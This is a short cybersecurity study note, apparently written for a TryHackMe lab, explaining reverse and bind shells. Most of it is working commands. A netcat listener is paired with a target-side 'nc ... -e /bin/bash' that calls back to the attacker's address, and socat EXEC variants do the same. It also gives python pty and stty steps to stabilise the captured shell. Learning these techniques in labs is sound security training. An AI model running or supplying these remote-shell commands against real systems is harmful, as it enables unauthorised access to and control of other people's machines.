## reverse shell basic example

Topics: [[cybersecurity]]  [[tryhackme]]

---
# Reverse Shell Basic Examples

```
# attackBox = local attacking machine
# targetBox = remote target machine

# Example configuration
attackBox IP address = 10.6.6.6
targetBox IP address = 192.168.8.8
```
**Reverse shells**
- The attackBox starts a listener for incoming connections.   
- The targetBox executes code to connect back to the attackBox IP address and listening port giving shell access to the target.

**Bind shells**  
- The targetBox executes code to start a listener attached to a shell.  
- The attackBox connects to targetBox IP addressand listening port gaining shell access.
- Bind shells may be prevented by firewalls.

## Netcat
If netcat is not installed
```sh
sudo apt install netcat
```
### Netcat Basic Usage

1. `attackBox:~$ _` start listener on port 443   
   - *Listener ports below 1024 will require sudo*

```sh
sudo nc -lvnp 443
```  
About command syntax
```text
`-l` (listen)  
`-v` (give more verbose output)  
`-n` (do not use DNS hostname lookup)  
`-p` (specify port number)  
```

2. `targetBox:~$ _`
```sh
nc 10.6.6.6 443 -e /bin/bash
```
If connection is successful a result should be displayed on `attackBox` (similar to)  
```sh
connect to [10.6.6.6] from (UNKNOWN) [192.168.8.8] 55123
```
`attackBox:~$ _` `CTRL-C` to terminate the connection.


### Netcat Advanced Usage
*Improve usability and shell stabilisation*
#### Python method

1. `attackBox:~$ _`
```sh
sudo nc -lvnp 443
```  
2. `targetBox:~$ _`
```sh
sudo nc 10.6.6.6 443 -e /bin/bash
```  
Upon successful connection  
3. `attackBox:~$ _`
```sh
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```  
4. `attackBox~$ _` `CTRL-Z` to suspend the current foreground process 
5. `attackBox~$ _`
```sh
stty raw -echo; fg
```  
***You should now have full remote shell access to `targetBox`***
   
*Upon shell disconnection there will be no terminal output.  
`attackBox~$ _` `reset` to reset the terminal settings

#### rlwrap method

If rlwrap is not installed
```sh
sudo apt install rlwrap`
```
1. `attackBox:~$ _`
```sh
sudo rlwrap nc -lvnp 443
```  
2. `targetBox:~$ _`
```sh
sudo nc 10.6.6.6 443 -e /bin/bash
```  
Upon successful connection  
3. `attackBox~$ _` `CTRL-Z` to suspend the current foreground process   
4. `attackBox~$ _`
```sh
stty raw -echo; fg
```  

## socat
*Requires socat on both attack and target boxes.*
```sh
sudo apt install socat
```

#### Basic Usage
1. `attackBox:~$ _`
```sh
socat TCP-L:443 -
```  
2. `targetBox:~$ _`
```sh
sudo socat TCP:10.6.6.6:443 EXEC:"bash -li"
```  

#### Advanced Usage
1. `attackBox:~$`
```console
sudo socat TCP-L:443 FILE:`tty`,raw,echo=0
```
2. `targetBox:~$_`
```console
socat TCP:10.6.6.6:443 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

## Resources and References  
- [TryHackMe intro to shells](https://tryhackme.com/room/introtoshells)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
